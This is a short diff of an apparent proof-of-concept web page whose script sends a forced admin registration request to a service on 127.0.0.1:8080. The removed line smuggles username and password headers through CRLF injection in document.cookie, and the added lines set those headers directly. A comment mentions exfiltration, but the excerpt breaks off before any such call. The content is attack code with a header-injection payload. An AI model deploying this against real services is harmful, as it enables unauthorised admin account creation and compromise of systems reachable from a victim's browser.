@@ -3,9 +3,12 @@
 
 <body>
   <script>
-    document.cookie = "whatever\r\nX-Username: admin\r\nX-Password: pwned123";
     fetch("http://127.0.0.1:8080/register", {
       method: "POST",
+      headers: {
+        "X-Username": "admin",
+        "X-Password": "pwned123"
+      },
       body: "force=1" // body required but irrelevant
     }).then(r => r.text()).then(t => {
       // Exfil just for confirmation
